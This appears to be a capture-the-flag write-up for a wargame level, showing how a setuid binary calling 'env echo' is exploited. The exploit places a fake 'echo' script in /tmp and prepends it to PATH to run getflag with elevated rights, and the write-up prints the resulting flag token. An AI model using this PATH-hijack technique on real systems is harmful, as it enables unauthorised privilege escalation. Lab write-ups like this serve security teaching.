As per usual we start by simply listing all the files of the repository:
```
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

Looks like this time we have an executable, well let's try to run it.
```
Exploit me
```

Let's use hexdump on the executable
```
hexdump -C level03

000005b0  f8 ff 75 f4 83 c4 04 5b  5d c3 90 90 53 83 ec 08  |..u....[]...S...|
000005c0  e8 00 00 00 00 5b 81 c3  2f 1a 00 00 e8 4f fe ff  |.....[../....O..|
000005d0  ff 83 c4 08 5b c3 00 00  03 00 00 00 01 00 02 00  |....[...........|
000005e0  2f 75 73 72 2f 62 69 6e  2f 65 6e 76 20 65 63 68  |/usr/bin/env ech|
000005f0  6f 20 45 78 70 6c 6f 69  74 20 6d 65 00 00 00 00  |o Exploit me....|
00000600  01 1b 03 3b 30 00 00 00  05 00 00 00 70 fd ff ff  |...;0.......p...|
```

Here we realize that the function, to write "Exploit me" is using a syscall defined in the environment.
Or we also realize by trying that we have access to the environment.

So here is the way that we can abuse this:

```
echo '/bin/getflag' > /tmp/echo
chmod 777 /tmp/echo
export PATH=/tmp:$PATH
./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
